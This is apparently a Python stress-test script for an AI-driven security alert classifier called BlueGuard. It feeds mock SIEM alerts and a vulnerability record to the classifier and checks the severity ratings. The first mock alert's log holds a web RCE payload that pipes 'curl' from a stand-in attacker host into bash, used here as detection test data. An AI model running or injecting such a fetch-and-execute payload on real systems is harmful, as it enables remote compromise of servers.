import sys
import os
import json
import time

# Add parent directory to path to import analyzer
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from analyzer import classify_attack, analyze_vulnerability

def print_separator(title):
    print(f"\n{'='*20} {title} {'='*20}\n")

def run_ultimate_test():
    print("\n🚀 INITIALIZING BLUEGUARD ULTIMATE STRESS TEST (A to Z) 🚀")
    print("Testing AI Engine against Extreme Scenarios...\n")

    # =========================================================================
    # TEST CASE 1: The Zero-Day Perimeter Exploit (Alert Stream)
    # =========================================================================
    print_separator("TEST CASE 1: ZERO-DAY VPN EXPLOIT ALERT (classify_attack)")
    mock_alert_1 = {
        "rule": {
            "description": "Suspicious web traffic pattern matching Ivanti Connect Secure / Pulse Secure RCE bypass.",
            "level": 14,
            "groups": ["web", "exploit", "rce"]
        },
        "agent": {
            "name": "FW-GATEWAY-01"
        },
        "full_log": "POST /api/v1/totp/validate HTTP/1.1 payload: <% Runtime.getRuntime().exec('curl http://c2.hacker.com/malware.sh | bash'); %>"
    }
    
    print("Sending Complex Web RCE Payload to AI Engine...")
    start_time = time.time()
    try:
        res1 = json.loads(classify_attack(mock_alert_1))
        print(f"Time Taken: {round(time.time() - start_time, 2)}s")
        print(f"Threat Actor:     {res1.get('threat_actor')}")
        print(f"Attack Vector:    {res1.get('attack_vector')}")
        print(f"MITRE Technique:  {res1.get('mitre_technique_id')} - {res1.get('mitre_technique_name')}")
        print(f"Mapped CVE(s):    {res1.get('cve_id')}")
        print(f"Risk Severity:    {res1.get('risk_severity')} (CVSS: {res1.get('cvss_score')})")
        print("Remediation Steps:")
        steps = res1.get('remediation_steps', '')
        if isinstance(steps, str):
            for i, step in enumerate(steps.split('\\n'), 1):
                if step.strip(): print(f"  {i}. {step.strip()}")
        elif isinstance(steps, list):
            for i, step in enumerate(steps, 1): print(f"  {i}. {step}")
        if res1.get('risk_severity') in ['High', 'Critical'] and 'CVE' in str(res1.get('cve_id')):
            print("✅ TEST 1 PASSED: AI accurately mapped a zero-day web payload to critical MITRE/CVE logic.")
        else:
            print("❌ TEST 1 FAILED: Inaccurate severity or missing CVE.")
    except Exception as e:
        print(f"❌ TEST 1 ERROR: {e}")

    # =========================================================================
    # TEST CASE 2: The Insider Threat Vulnerability (BIA & CIA Matrix)
    # =========================================================================
    print_separator("TEST CASE 2: INTERNAL PRIVILEGE ESCALATION (analyze_vulnerability)")
    mock_vuln_2 = {
        "asset_name": "WIN-SRV-CORE-03",
        "vuln_name": "Windows Print Spooler Privilege Escalation (PrintNightmare)",
        "cve_id": "CVE-2021-34527",
        "nessus_severity": "Critical",
        "vpr_score": "9.5"
    }
    
    print("Testing CIA Mathematical Reduction on Internal Asset...")
    start_time = time.time()
    try:
        res2 = json.loads(analyze_vulnerability(mock_vuln_2))
        print(f"Time Taken: {round(time.time() - start_time, 2)}s")
        print(f"Final Org Risk:   {res2.get('org_risk')}")
        cia = res2.get('cia_matrix', {})
        print(f"CIA Matrix:       C:{cia.get('confidentiality')}/10, I:{cia.get('integrity')}/10, A:{cia.get('availability')}/10")
        print("Control Context:")
        print(f"  {res2.get('control_context')}")
        print("Business Impact (Possibilities):")
        for i, point in enumerate(res2.get('business_impact', []), 1):
            print(f"  {i}. {point}")
        
        # Validation: If it's internal privilege escalation, Confidentiality/Integrity should be high, 
        # but the firewall mitigates external threats.
        if int(cia.get('integrity', 0)) >= 5 and res2.get('org_risk') in ['High', 'Critical']:
            print("\n✅ TEST 2 PASSED: AI correctly identified internal Integrity risk despite perimeter Firewalls.")
        else:
            print("\n❌ TEST 2 FAILED: AI did not properly weigh internal privilege escalation.")
    except Exception as e:
        print(f"❌ TEST 2 ERROR: {e}")

    # =========================================================================
    # TEST CASE 3: The Reconnaissance / False Positive
    # =========================================================================
    print_separator("TEST CASE 3: LOW LEVEL NOISE / RECONNAISSANCE (classify_attack)")
    mock_alert_3 = {
        "rule": {
            "description": "Multiple authentication failures for user 'admin' from internal IP 10.0.0.45",
            "level": 5,
            "groups": ["authentication_failed", "recon"]
        },
        "agent": {
            "name": "LINUX-DEV-01"
        },
        "full_log": "sshd[1234]: Failed password for admin from 10.0.0.45 port 54321 ssh2"
    }
    
    print("Testing AI's ability to filter out noise and assign low risk...")
    start_time = time.time()
    try:
        res3 = json.loads(classify_attack(mock_alert_3))
        print(f"Time Taken: {round(time.time() - start_time, 2)}s")
        print(f"Attack Vector:    {res3.get('attack_vector')}")
        print(f"MITRE Technique:  {res3.get('mitre_technique_id')} - {res3.get('mitre_technique_name')}")
        print(f"Risk Severity:    {res3.get('risk_severity')} (CVSS: {res3.get('cvss_score')})")
        print(f"Forensic Summary: {res3.get('forensic_summary')}")
        
        if res3.get('risk_severity') in ['Low', 'Medium']:
            print("\n✅ TEST 3 PASSED: AI correctly identified this as a low-level brute force/recon event, preventing alert fatigue.")
        else:
            print("\n❌ TEST 3 FAILED: AI panicked and gave a High/Critical severity to a simple failed login.")
    except Exception as e:
        print(f"❌ TEST 3 ERROR: {e}")

    print_separator("STRESS TEST COMPLETE")

if __name__ == '__main__':
    run_ultimate_test()
